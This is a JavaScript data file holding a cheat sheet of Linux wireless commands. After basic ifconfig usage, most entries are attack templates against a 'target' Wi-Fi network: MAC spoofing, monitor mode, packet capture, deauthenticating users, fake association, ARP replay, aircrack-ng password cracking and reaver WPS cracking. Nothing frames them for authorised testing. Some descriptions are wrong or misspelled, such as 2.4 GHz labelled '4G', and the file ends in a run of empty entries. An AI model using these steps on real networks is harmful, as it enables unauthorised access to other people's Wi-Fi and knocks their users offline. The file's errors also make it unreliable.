const data = [
  {
    title: "Ifconfig",
    description: `
            The \`ifconfig\` command in Linux is used to configure, manage, and query network interface parameters. 
            It allows you to view or configure the network interface's IP address, netmask, broadcast address, 
            and other settings. This command is typically used for troubleshooting or configuring network interfaces manually.
      
            **Example:**
      
            To view all active network interfaces and their configurations, you can use the following command:
      
            \`\`\`
            ifconfig
            \`\`\`
      
            This will display information such as IP address, subnet mask, and broadcast address for each interface.
          `,
  },
  {
    title: "Disable Interface with ifconfig",
    description: `
  command : ifconfig  ...(interface name/device name/ adapter name) down
    `,
  },
  {
    title: "Change Mac/Ether Address with ifconfig",
    description: `
    command: ifconfig ...(interface name/device name/ adapter name) hw ether ...(new Mac address) (Note: Make sure to start your address with 00)
    `,
  },
  {
    title: "Enable Interface with ifconfig",
    description: `
  command : ifconfig  ...(interface name/device name/ adapter name) up
    `,
  },
  {
    title: `Iwconfig`,
    description: ``,
  },
  {
    title: ` / Command to kill/close/remove all process`,
    description: `command : Airmon-ng check kill`,
  },
  {
    title: `Change mode Monitor/Managed`,
    description: `Command : iwconfig ...(interface/Device Name/ adapter name) mdoe ...(monitor/managed)`,
  },
  {
    title: `Discover all wireless/wifi 4G/2.4ghz newtworks`,
    description: `command: airodump-ng ...(interface name/ device name/ adapter name)`,
  },
  {
    title: `Discover all wireless/wifi 5G/5ghz newtworks`,
    description: `Comand : airodump-ng --band a ...(interface name/Device name/ adapter name)`,
  },
  {
    title: `Discover all wireless/wifi 4G/5G/2.4Ghz/5ghz newtworks`,
    description: `command:  airodump-ng --band abg ...(interface name/ device name/ adapter name )`,
  },
  {
    title: `targeted sniffing / discover only specific Wireless network || Store data from specific network`,
    description: `
    command: airodump-ng --bssid ...(bssid id of that newtwork/ device) --channel ...(channel number) --write ...(file name where you want to store logs of this file) ...(interface name/ device name / adapter name)
    `,
  },
  {
    title: `Deauth / remove user from wifi`,
    description: `
    command: aireplay-ng --deauth ...(for how much mili seconds. like: 100000) -a ...(Bssid of the wifi network) -c ...(your target mac address) ...(interface name/ device name/ adapter name)
    `,
  },
  {
    title: `Crack Wifi password with aircrack-ng`,
    description: `aircrack-ng ...(your network data file with.cap [data of your target wifi network, more than 60K] )`,
  },
  {
    title: `Fake newtwork association with aireplay-ng`,
    description: `command: aireplay-ng --fakeauth ...(how much time you want to send request for association, example: 0 means just once) -a ...(your target network/wifi bssid) -h ...(your interface/adapter/device mac address) ...(your interface name/ device name/ adapeter name)`,
  },
  {
    title: `Send fake request to AP to generate new Packet of IV`,
    description: `command: aireplay-ng --arpreplay -b ...(target network bssid) -h ...(your mac address) ...(interface name/device name/ adapter name)`,
  },
  {
    title: `Find all device where WPS is on / enabled`,
    description: `wash --interface ...(interface name/device name/ adapter name)`,
  },
  {
    title: `Crack password with WPS`,
    description: `command :
    check WPS is enable ? : wash --interface ...(interface name/device name/ adapter name)
    then: aireplay-ng --fakeauth 40 -a ...(target network bssid) -h ...(your mac address)  ...(interface name/device name/ adapter name)
    now: reaver --bssid ...(target network bssid) --channel ...(target network channel number) --interface ...(interface name/device name/ adapter name) -vvv --no-associate
    `,
  },
  {
    title: ``,
    description: ``,
  },
  {
    title: ``,
    description: ``,
  },
  {
    title: ``,
    description: ``,
  },
  {
    title: ``,
    description: ``,
  },
  {
    title: ``,
    description: ``,
  },
  {
    title: ``,
    description: ``,
  },
  {
    title: ``,
    description: ``,
  },
  {
    title: ``,
    description: ``,
  },
  {
    title: ``,
    description: ``,
  },
  {
    title: ``,
    description: ``,
  },
  {
    title: ``,
    description: ``,
  },
];
export default data;
